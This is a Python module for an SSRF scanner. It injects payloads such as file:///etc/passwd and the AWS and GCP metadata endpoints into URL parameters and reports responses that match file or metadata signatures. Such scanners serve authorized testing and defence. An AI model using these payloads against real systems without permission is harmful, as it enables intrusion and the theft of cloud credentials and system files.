import requests
from colorama import Fore

class SSRFScanner:
    def __init__(self):
        self.payloads = [
            # Localhost / Internal Network (Basic)
            {"payload": "http://127.0.0.1", "check": "200", "type": "SSRF (Localhost Access)"},
            {"payload": "http://localhost", "check": "200", "type": "SSRF (Localhost Access)"},
            {"payload": "http://0.0.0.0", "check": "200", "type": "SSRF (Localhost Access)"},
            
            # File Protocol (LFI via SSRF)
            {"payload": "file:///etc/passwd", "check": "root:x:", "type": "SSRF (Local File Read - LFI)"},
            {"payload": "file:///c:/windows/win.ini", "check": "[fonts]", "type": "SSRF (Local File Read - LFI)"},

            # Cloud Metadata (AWS)
            {"payload": "http://169.254.169.254/latest/meta-data/", "check": "ami-id", "type": "SSRF (AWS Metadata)"},
            {"payload": "http://169.254.169.254/latest/user-data", "check": "200", "type": "SSRF (AWS UserData)"},

            # Cloud Metadata (GCP) - usually requires headers, but we try basic first
            {"payload": "http://metadata.google.internal/computeMetadata/v1/", "check": "Google", "type": "SSRF (GCP Metadata)"},
        ]
        
        self.aws_headers = {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
        self.gcp_headers = {"Metadata-Flavor": "Google"}

    def scan(self, target_url):
        """
        Scans URL parameters for SSRF.
        """
        if "=" not in target_url: return []

        print(f"{Fore.CYAN}[*] Checking for SSRF on {target_url}...")
        findings = []

        try:
            base, params = target_url.split('?', 1)
            pairs = params.split('&')

            for payload in self.payloads:
                for i, pair in enumerate(pairs):
                    if '=' in pair:
                        key, val = pair.split('=', 1)
                        
                        # Strategy: Replace value
                        new_pairs = pairs[:]
                        new_pairs[i] = f"{key}={payload['payload']}"
                        test_url = f"{base}?{'&'.join(new_pairs)}"

                        if self._run_check(test_url, payload):
                             findings.append(self._create_finding(test_url, key, payload))
                             continue # Move to next payload to avoid spamming same param
                             
        except Exception:
            pass
            
        return findings

    def _run_check(self, url, payload):
        try:
            # Short timeout to avoid hanging on firewall drops
            # We try with and without specific cloud headers for max coverage
            
            # 1. Standard Request
            res = requests.get(url, timeout=3)
            
            if self._analyze_response(res, payload): return True
            
            # 2. Try with AWS IMDSv2 Token (Optional, sophisticated)
            # This is complex to automate blindly because it's a 2-step process (PUT then GET)
            # Simple blind scanners just try to hit the endpoint. 
            # If we get a 401 Unauthorized from 169.254.169.254, that CONFIRMS SSRF too!
            
            if "169.254.169.254" in payload['payload']:
                if res.status_code == 401 and "Server" not in res.headers: # Heuristic
                     return True 
                     
            # 3. GCP Headers
            if "google.internal" in payload['payload']:
                 res_gcp = requests.get(url, headers=self.gcp_headers, timeout=3)
                 if self._analyze_response(res_gcp, payload): return True

        except requests.exceptions.Timeout:
            # Timeout MIGHT indicate open firewall port but no service (Blind SSRF)
            # But prone to false positives. We ignore for now unless specifically scanning ports.
            pass
        except:
            pass
        return False

    def _analyze_response(self, res, payload):
        # Specific Content Check
        if payload['check'] == "200":
             # Basic reachability check.
             # Hard to distinguish from "target ignored param and returned 200 of main page".
             # We need to compare length/content diff? 
             # For now, let's look for specific error messages or assume high false positive risk
             # and allow user to verify.
             # BETTER: Check if response differs significantly from baseline.
             # Implementation simplification: we skip generic 200 checks for now and rely on specific signatures
             return False 
        
        if payload['check'] in res.text:
            return True
        return False

    def _create_finding(self, url, param, payload):
        print(f"{Fore.RED}[!!!] {payload['type']} Found: {url}")
        return {
            "type": payload['type'],
            "details": f"Parameter '{param}' accessed internal resource: {payload['payload']}",
            "url": url,
            "payload": payload['payload']
        }
